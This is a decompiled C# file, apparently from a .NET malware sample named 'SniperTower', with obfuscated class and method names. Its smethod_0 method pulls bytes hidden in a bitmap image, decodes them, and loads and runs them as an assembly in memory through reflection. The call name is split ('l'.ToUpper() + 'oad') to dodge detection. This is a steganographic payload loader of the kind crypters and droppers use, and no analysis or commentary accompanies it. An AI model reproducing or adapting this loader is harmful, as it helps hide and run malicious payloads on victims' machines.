using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;

namespace SniperTower;

public class GClass4 : Component
{
	private IContainer icontainer_0 = null;

	public static void Main(string[] args)
	{
		for (int i = 0; i < 1; i++)
		{
			new GClass0();
		}
	}

	public static string smethod_0()
	{
		GClass2 gClass = new GClass2();
		if (gClass.byte_0 == null)
		{
			Bitmap bitmap_ = GClass5.smethod_0(gClass.string_0 + gClass.string_1 + gClass.string_2 + gClass.string_3 + gClass.string_4 + gClass.string_5);
			byte[] byte_ = GClass3.smethod_0(bitmap_);
			byte[] array = (gClass.byte_0 = GClass1.smethod_1(byte_));
		}
		Assembly assembly = (Assembly)GClass1.smethod_0(typeof(Assembly), "l".ToUpper() + "oad", new object[1] { gClass.byte_0 });
		object obj = GClass1.smethod_0(typeof(LateBinding), "LateGet", new object[6] { assembly, null, "EntryPoint", null, null, null });
		GClass1.smethod_0(typeof(LateBinding), "LateGet", new object[6]
		{
			obj,
			null,
			"Invoke",
			new object[2],
			null,
			null
		});
		return 14.ToString();
	}

	public GClass4()
	{
		method_0();
	}

	public GClass4(IContainer icontainer_1)
	{
		icontainer_1.Add(this);
		method_0();
	}

	protected override void vmethod_0(bool bool_0)
	{
		if (bool_0 && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		base.Dispose(bool_0);
	}

	private void method_0()
	{
		icontainer_0 = new Container();
	}
}
